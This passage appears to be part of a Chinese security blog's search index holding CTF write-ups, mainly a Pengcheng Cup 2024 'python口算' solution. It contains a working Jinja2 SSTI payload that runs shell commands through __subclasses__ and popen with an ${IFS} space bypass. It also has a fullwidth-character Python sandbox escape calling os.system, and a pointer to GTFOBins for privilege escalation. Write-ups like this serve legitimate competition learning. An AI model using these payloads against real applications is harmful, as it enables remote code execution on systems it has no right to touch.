+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;blocks&quot;</span>:&#123;<span class="string">&quot;languageVersion&quot;</span>:0,<span class="string">&quot;blocks&quot;</span>:[&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;text&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="string">&quot;azg=&#125;0JkK6nkl7VO]NMG&quot;</span>,<span class="string">&quot;x&quot;</span>:273,<span class="string">&quot;y&quot;</span>:141,<span class="string">&quot;fields&quot;</span>:&#123;<span class="string">&quot;TEXT&quot;</span>:<span class="string">&quot;＇；＿＿ｉｍｐｏｒｔ＿＿（＂ｂｕｉｌｔｉｎｓ＂）．ｌｅｎ＝ｌａｍｂｄａ ｘ：０；ｐｒｉｎｔ（＿＿ｉｍｐｏｒｔ＿＿（＂ｏｓ＂）．ｓｙｓｔｅｍ（＂ｌｓ＂））；＇&quot;</span>&#125;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>后续还得提权，suid和dd提权直接跑https://gtfobins.github.io/就行了</p>
+]]></content>
+      <tags>
+        <tag>竞赛复盘</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>鹏城杯2024-python口算</title>
+    <url>/2024/11/09/pcb2024-python-calc/</url>
+    <content><![CDATA[<p>队友yeepie师傅做出来的，队友yeepie师傅做出来的，队友yeepie师傅做出来的</p>
+<p>我是搬运我是搬运我是搬运</p>
+<h2 id="python口算">python口算</h2>
+<p>1秒内计算算式，从页面中获取到乘法算式，很常见的题目，正则python发包，gpt一句话的事</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&quot;http://192.168.18.28&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_expression</span>(<span class="params">expression</span>):</span><br><span class="line">tokens = re.findall(<span class="string">r&#x27;\d+|[+\-*/]&#x27;</span>, expression)</span><br><span class="line">result = <span class="built_in">eval</span>(<span class="string">&#x27;&#x27;</span>.join(tokens))</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">res = requests.get(url + <span class="string">&quot;/calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;抓取到的算式:&quot;</span>, res.text)</span><br><span class="line">result = calculate_expression(res.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;计算结果:&quot;</span>, result)</span><br><span class="line">submit_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=%E6%8F%90%E4%BA%A4&quot;</span></span><br><span class="line">response_get = requests.get(submit_url)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;GET 请求返回的响应页面：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response_get.text)</span><br></pre></td></tr></table></figure></div>
+<p>成功 返回/static/f4dd790b-bc4e-48de-b717-903d433c597f</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">solved=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">global</span> current_expr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前端计算</span></span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">    <span class="comment"># 通过计算</span></span><br><span class="line"></span><br><span class="line">    username = <span class="string">&#x27;ctfer!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> whitelist_filter(username,whitelist_patterns):</span><br><span class="line">            <span class="keyword">if</span> blacklist_filter(username):</span><br><span class="line">                <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;你过关！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, username=username, hint=<span class="string">&quot;f4dd790b-bc4e-48de-b717-903d433c597f&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<p>ssti打即可</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">是ssti 过滤了空格，$&#123;IFS&#125;绕过即可拿到flag</span><br><span class="line">notadmin-pcb2024</span><br><span class="line">url = <span class="string">&quot;http://192.168.18.28&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_expression</span>(<span class="params">expression</span>):</span><br><span class="line">tokens = re.findall(<span class="string">r&#x27;\d+|[+\-*/]&#x27;</span>, expression)</span><br><span class="line">result = <span class="built_in">eval</span>(<span class="string">&#x27;&#x27;</span>.join(tokens))</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">res = requests.get(url + <span class="string">&quot;/calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;抓取到的算式:&quot;</span>, res.text)</span><br><span class="line">result = calculate_expression(res.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;计算结果:&quot;</span>, result)</span><br><span class="line">submit_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=%E6%8F%90%E4%BA%A4&quot;</span></span><br><span class="line">response_get = requests.get(submit_url)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;GET 请求返回的响应页面：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response_get.text)</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()</span></span><br><span class="line"><span class="string">[133].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat$&#123;IFS&#125;/flag&#x27;).read()&#125;&#125;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">response_post = requests.post(submit_url, data=data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;提交后的响应页面（POST）：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response_post.text)</span><br></pre></td></tr></table></figure></div>
+]]></content>
+      <tags>
+        <tag>竞赛复盘</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ezEIP Upload RCE</title>
+    <url>/2024/11/08/DVB-2023-4987/</url>
+    <content><![CDATA[
+<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="497b095794d9304f221dd42a1593369c5f11cc356a12d1095141c21fdfac5b22">11f05ec438d0ff2a949da9113ef4898ba65555396aa4fa8b9c5ba3970e51640ebb8f04193d34b093c073b47ba4dca48064e6df8d691b9d1c32d2a98ac388cd371cdc9050f38c38a71260e4f93b144337ab451ee47c410254ce630d9af922a700e77316f4beb978db18fddcd53274c8450c123d2335456a4d158b4ca3b0493e93c23e55646268a09879166f4c9360892391af277ef9d443d213cdfd86c67b607a3d79ad7f91c946d4bb71634b9972b52a050af2c84893a36507a6f6015e49a625ce6c2c3bca7820a1ef140b621d797b53f48ca0ace186eb69397645d2bca0133cd15bc9aa7e10a56be071e444dd820c480d7b252e10eec2b8577e00657a84f33918033b089b16f0851a0ebe8a0be26e95ee3bc8570a29f9305dab6e647e8174641ce70f2951cf70664fcc706c389a94f1b9900963aff3e074d2fb44c07ca298a8b9f3ba507566d8fb4674fa7a744ee86c22e7ebc0507eb5297db13db2181ef96cc1ff628a41fc1cab772dce5096764fcf4ffec1dd4caacc2b4d8c816413a4cbfe83192f15510f02e3beb04be96cd7d859db00cbed9076a7d3cf2c1a9bed454afa15735fafccc8e52768a80ea4d724e1d3ce5fd4844ec4b65a1af3f08fe9f95dec13111d1236f9bbeda981c2683a17232a23a88f9b1541e0009b9b69a1061e276a0f93c2f763e87b6406645ca350fb27de712c24c2005658ed3db59a56a23d2474d921e0bee79ec99879e611ca539463e933c492c1d13384b9c775527771169d6fd789ca1cff354bf85cf768fe9dbb2c848a69ef36b07a48a07c131e15bccb927517a1e5293037435531891cf5c1e36f92d49383e12c6f69c7449c7c677d255d9e6f1e223a821e5ea6c63cbbc68433f7e60aeacca64f11eb91dc45112e4a94126403bb75be6b75a094f292478bb3407d6d7df3ecaed4f85d025523272f8e129a26f8a5c8a0ee64b1ebb721c2e9460dbca3ec7dcbf1d9aa196a0bff46f0d7506073fe470c85b5e9852e2f0633db3970927888b92a1e00bb32031231f92774ee2646ff816d043dbfa6550fe3aadd5c0397f6d6eb34aae42eeb03e74858ca02e8a90550975fdf4eeb8a9e54e8c81bb5944a2788f16765824459700f1346b605cde33545138a8669bd5210b52d6d3aede14f51b5437ee475dde98b0cea0973250993f9d663d12c1263f76e1c8b19836e1bfce81cee4f5c67c58165d2e1bb900f72ac7993f13200c9eab57229ab15128bd43adb7189bb978aeb2ae7cd6e79623851adff262de1cce524ec8a54c04269fb78c4a25a2493800b9657728cfe13e851f7654eb26103bd73fe55d02d4877d35302dec94aca25f7651ae449cdb0ac4b236f65a2e16e6f5995ebfb06184a9f9fa77f192d5219398fb06c57496112cdee561063eb1fd6ccb594a92cc3fcb35055e4782257a39f3b9790978dbf473aef1757d4398bd9ba142afe8354f9f250eb0b10a1c7aa61546728f671a53d94dafa2e81fca3053a5cf68eb68cfafe81d9a85e55e29353a5d19fef49edadb23a81f583d5ba6935f15fdb6a9c4c4aa38d883b43b8e25bacfe2baa15eda5098f8186b35f71f08e8f9bf04289dfa790f10ac9251c674c296732e28ff70756f42069001843dc9df68f215cebdc9891b22593427bd1d25c2cdcdb9a5cad40829a8db8621d548398a5f2d2a89001533df4ba092e0cfa871f4ee2323ee00a4a0a1db84c478320d19cd834d6f855baf3cb34ef0e57f4ae25f2718bd710fd31f1a801d18132e51ce8384778b895639cd047084bd0d777fc5b11d3a5aacb2452099f4881add9edf9bf79cab9d9ecc32d3dea96c5a585b21e0fe1f67ee4a03e98f9c1a6f5f12af543ac62f295e481f4e473c8c06dd76ddb7394bc95044e5416042dd02a80a388f16723067be4d2d89fa90a62c918abb52966fcbc61a77f9fca79ed2e1de9510b38f663305b9ef11a7b89dc52412dbdcf7206f48e721c3f9f68d24c933981dc170b9220cdd9ec6e16ef25a5b014b6954f0760ec740807026186b3156ff168bc9a323ef7564bc7dbd82c7e9fb66f4dc9ef9c4704118c8022006170da16566e7dd1d868e2717fb20ecaec7dac3eaccf2470de4364716b5404b07deb950a9f239cd0a9c6c56dc0a9b1772b28ec260a42093d9583619f133089548a0ebb626c01726f2e8f5c325f460421d761a4baecc895eab544152174691e12576511efe33ed84b5520bc2beaf02ac65d5d29982fd4494efd472b18bc1b3beef4799eb2982de508129869b457ca5a74210f4d4bebc483ee4f246fbda3d5574da15cbe210054a81558e97e38b16c1f3b1c3156b61425fa4902b664e388f1ba7f4aa7fcb23fa64e793cc96a1b0f736daf7fe1e41717358b6a710f14b8e91e1b8f93063ad79bb65b9f526a045073ce5e8e44523ef90eeb93502315a276e998b733a49f24431ef0b632d17f27d05d653a5d7b0db723b77f04db41fce4c226a390bb2dfba12c81ba96984c40f77935694829ead7a09e5f0d367fb4b2619925f457b6ee084f2b0d27a256df9336da7957f37cf5597a0e446be7dd35378470aa0612bea76208e2372191b19c8178fdd384fb06073d79348f44c8fc94365a68f773d90dcd12f9d9024a592b01fd23b0165d7ed0cf2faa23d6f5c72400f7422feece1d8c210bef54aa0fc355464ce310517fe32d3998f362142ee7fcc649fc8fa5208e6a8bf8704a10b382fd9d3379058b8c26d0b7cdf65cde4175433cebd72340da3e35710c51920968de03b14ed55573037b67c473266e4997a18110efa73f4b3c88b4231b6d7d2669aaebb8d4295588fcab88d180f7a12204049b5bc023cda44418dbd2cc855634f7af4d3d8d35d42c6276fadb1e3071da473115ce8129a2fdd6aa686c0408e1b19baa16179d5d28a1732ae88c6f523120070d6f7dbf0d6c4f71752441d113aaf9d0ee0b9280913076ad28097155083794496d48faa7f7c6519f9937b7d76b019c2b0d1f14695086e867e9cc5164797711781df7da874125e72c39d08d6cf4640d12b30f0c236bb0af36a0f5e9eee38697242353dff033c1a4c69b60e38587035d5c9610cefa2c4d2ac368505c3e34706ecebbc8ee6e558f44af93bfd6fea9ce0203778ed430eab9b17694d59aa222ec0ff9ac1298cc92ffdea87e5519f0547595a567f46c3d7c3608440d90517a20e35c0f8939dd04318bda92e5463627daa935e5f0b7b2ae34f0e88ba615ba6fb18cb56bf1f5f0bc427e0e2715edc3a59a08e271a5bdb811e5f78d30256771666c9b1997a8cb4182bd91c81aa11fbba50937285ac11a8d4c55e9f51aad3f533968b541ae3fe11050c92882fa</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
+<script data-swup-reload-script type="module">
+import {initHBE} from "/js/plugins/hbe.js";
+  console.log("hexo-blog-encrypt: loaded.");
+    initHBE();
+</script>
 ]]></content>
       <tags>
         <tag>day</tag>
